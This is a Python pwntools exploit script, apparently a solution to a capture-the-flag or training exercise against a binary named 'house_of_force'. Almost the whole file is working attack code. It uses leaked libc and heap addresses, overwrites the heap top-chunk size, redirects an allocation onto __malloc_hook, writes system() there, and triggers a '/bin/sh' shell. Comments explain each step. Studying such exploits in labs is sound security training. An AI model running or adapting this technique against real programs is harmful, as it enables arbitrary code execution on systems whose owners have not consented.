#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("house_of_force")
libc = elf.libc

gs = '''
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

# Select the "malloc" option, send size & data.
def malloc(size, data):
    io.send("1")
    io.sendafter("size: ", f"{size}")
    io.sendafter("data: ", data)
    io.recvuntil("> ")

# Calculate the "wraparound" distance between two addresses.
def delta(x, y):
    return (0xffffffffffffffff - x) + y

io = start()

# This binary leaks the address of puts(), use it to resolve the libc load address.
io.recvuntil("puts() @ ")
libc.address = int(io.recvline(), 16) - libc.sym.puts

# This binary leaks the heap start address.
io.recvuntil("heap @ ")
heap = int(io.recvline(), 16)
io.recvuntil("> ")
io.timeout = 0.1

# =============================================================================

# =-=-=- EXAMPLE -=-=-=

# The "heap" variable holds the heap start address.
log.info(f"heap: 0x{heap:02x}")

# Program symbols are available via "elf.sym.<symbol name>".
log.info(f"target: 0x{elf.sym.target:02x}")

# The malloc() function chooses option 1 from the menu.
# Its arguments are "size" and "data".
malloc(24, b"Y"*24 + packing.p64(0xffffffffffffffff))       # overwrite top_chunk to make possible allocations massive
distance = (libc.sym.__malloc_hook - 0x20) - (heap + 0x20)  # calculate distance (come up 0x20 short on the malloc_hook since malloc places the next write exactly 32 bytes away from the end of the last malloc)
malloc(distance, "/bin/sh\0")   # not required unless we are going to pass heap + 0x30 = cmd, malloc(cmd,"").
malloc(24, p64(libc.sym.system))    # this does the malloc and write of *system overtop of malloc_hook
cmd = next(libc.search(b"/bin/sh")) # define the location of /bin/sh, this can be either heap +0x30 or /bin/sh present by default in libc
malloc(cmd, "") # call malloc (which executes *system), the __malloc_hook function takes on the argument that was passed to malloc (addr of /bin/sh) and so this becomes the execution of "system(/bin/sh)

# The delta() function finds the "wraparound" distance between two addresses.
log.info(f"delta between heap & main(): 0x{delta(heap, elf.sym.main):02x}")

# =============================================================================

io.interactive()
